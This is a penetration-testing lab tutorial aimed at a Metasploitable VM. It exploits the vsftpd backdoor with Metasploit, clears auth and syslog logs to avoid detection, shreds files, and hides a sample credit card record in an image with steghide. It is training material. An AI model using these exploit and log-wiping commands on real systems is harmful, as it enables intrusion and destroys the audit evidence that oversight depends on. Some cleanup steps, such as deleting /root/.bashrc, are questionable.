#Lab 4: Covering Your Tracks and Exfiltrating Data Using Steganography

This enhanced version of the lab will include more detailed, real-world tasks to make the experience more engaging and practical. Each task is broken down into clear steps that you can follow. The focus will be on **covering your tracks** after a penetration test and using **steganography** to exfiltrate sensitive data without detection.

---

### **Lab 4: Covering Your Tracks and Exfiltrating Data Using Steganography**

#### **Objective:**
- Learn the techniques to cover your tracks after a penetration test, including clearing logs, deleting files, and removing traces of access.
- Understand how steganography can be used to hide sensitive data in innocent-looking files and how to extract it later.

---

### **Preparation:**

1. **Victim Machine:**
   - Use **Metasploitable** (or any vulnerable VM) as the victim machine.
   - Ensure Metasploitable is running with a known IP address, e.g., `192.168.1.100`.

2. **Attacker Machine:**
   - Use **Kali Linux** or any penetration testing machine.
   - Ensure Kali is connected to the same network as the victim machine.

3. **Tools Required:**
   - **Steghide** (For hiding and extracting data in image files).
   - **Metasploit** (For exploitation, if needed).
   - **Nmap** (For scanning the network and services).
   - **Shred** (For secure file deletion).

---

### **Step 1: Initial Exploitation and Access**

#### Task 1: **Access the Victim Machine**

1. **Scan the Network**: 
   - Run a network scan from your attacker machine to discover the victim machineâ€™s IP.
     ```bash
     nmap -sP 192.168.1.0/24
     ```

2. **Exploit the Victim Machine**: 
   - Use **Metasploit** to exploit the victim machine (Metasploitable). Let's assume an easy-to-exploit vulnerability such as the **vsftpd backdoor**.
   - Start **Metasploit**:
     ```bash
     msfconsole
     ```

   - Use the exploit:
     ```bash
     use exploit/unix/ftp/vsftpd_234_backdoor
     set RHOSTS 192.168.1.100
     run
     ```

3. **Verify Access**:
   - Once you gain access, ensure you're in:
     ```bash
     whoami
     ```

   - You should see `root` or a similar user, depending on your privilege escalation.

---

### **Step 2: Covering Your Tracks**

#### Task 2: **Delete Created User Accounts**

1. **List all users on the victim machine**:
   - Identify any user accounts created during the exploitation.
     ```bash
     cat /etc/passwd
     ```

2. **Delete any malicious user accounts**:
   - If you created a test user during the exploitation, delete it securely.
     ```bash
     sudo userdel -r testuser
     ```

#### Task 3: **Clear System Logs**

1. **View the logs**:
   - Check the logs where traces of your attack might be stored, such as `auth.log` and `syslog`.
     ```bash
     sudo cat /var/log/auth.log
     sudo cat /var/log/syslog
     ```

2. **Clear the logs**:
   - Securely delete or truncate the logs to avoid detection.
     ```bash
     sudo truncate -s 0 /var/log/auth.log
     sudo truncate -s 0 /var/log/syslog
     ```

3. **Ensure there are no log traces left**:
   - Double-check the logs to verify that they have been cleared.
     ```bash
     sudo cat /var/log/auth.log
     ```

#### Task 4: **Delete Files and Tools Used**

1. **Identify and remove any malicious scripts or files**:
   - If you uploaded any files for persistence or exploitation, ensure they are deleted.
     ```bash
     sudo rm -rf /tmp/backdoor.sh
     sudo rm -rf /home/victim/.ssh/authorized_keys
     ```

2. **Use secure deletion**:
   - Use `shred` to securely delete any sensitive files.
     ```bash
     sudo shred -u /path/to/exfiltrated_file
     ```

---

### **Step 3: Exfiltrating Data Using Steganography**

#### Task 5: **Install Steghide and Set Up**

1. **Install Steghide on your attacker machine**:
   - Run the following command on Kali Linux:
     ```bash
     sudo apt install steghide
     ```

#### Task 6: **Prepare Sensitive Data to Exfiltrate**

1. **Create a sensitive data file**:
   - For demonstration, create a file called `secret.txt` containing sensitive information.
     ```bash
     echo "Credit card data: 4011 5555 5555 5555 5555 exp 08/29 ccv: 123" > secret.txt
     ```

2. **View the contents of `secret.txt`**:
   ```bash
   cat secret.txt
   ```

#### Task 7: **Hide Data in an Image Using Steghide**

1. **Prepare a cover file**:
   - Get an image file that will serve as your "cover file" (e.g., `image.jpg`).
   - Use any image of your choice (it can be a random image).

2. **Embed the sensitive data into the image**:
   - Use Steghide to embed `secret.txt` into `image.jpg`.
     ```bash
     steghide embed -ef secret.txt -cf image.jpg
     ```
   - You will be prompted for a passphrase. Enter a strong passphrase (e.g., `this-is-a-passphrase`).

#### Task 8: **Extract Hidden Data from the Image**

1. **Extract the data from the image**:
   - On your attacker machine, extract the hidden data from `image.jpg` using Steghide.
     ```bash
     steghide extract -sf image.jpg -xf extracted_data.txt
     ```
   - You will need to enter the passphrase again to extract the data.

2. **Verify the contents of the extracted file**:
   - Open the extracted file to ensure that the sensitive data was successfully exfiltrated.
     ```bash
     cat extracted_data.txt
     ```

---

### **Step 4: Final Cleanup and Restoration**

#### Task 9: **Restore the System to Its Original State**

1. **Remove any backdoors, services, or rootkits**:
   - Ensure that all backdoors and persistence mechanisms are removed from the compromised system.
     ```bash
     sudo rm -rf /root/.bashrc
     sudo rm -rf /etc/cron.d/backdoor
     ```

2. **Restore system configurations**:
   - If any system configurations were altered (e.g., firewall rules or sudo permissions), restore them to their original state.

#### Task 10: **Securely Delete Any Remaining Files**

1. **Shred any remaining files**:
   - Securely delete any remaining files or sensitive data using `shred`.
     ```bash
     sudo shred -u /path/to/remaining_sensitivedata
     ```

---

### **Step 5: Report and Documentation**

1. **Document all the actions taken**:
   - As part of a penetration test, it is essential to document all activities, tools used, and cleanup actions.
   - Include details about the exploit, payloads, user accounts created, and all cleanup actions performed.

2. **Generate a final report**:
   - Write a formal report outlining the findings from your engagement, including:
     - The methods used for exploitation and data exfiltration.
     - How the system was cleaned and restored.
     - Recommendations for improving security to prevent such attacks.

---

### **Conclusion:**

In this enhanced lab, you've learned the importance of **covering your tracks** after a penetration test and how to effectively **exfiltrate data** using **steganography**. You also practiced using **Steghide** to hide sensitive data in an image and extract it later without detection. Finally, you documented all your actions to ensure a thorough, ethical, and professional penetration testing engagement.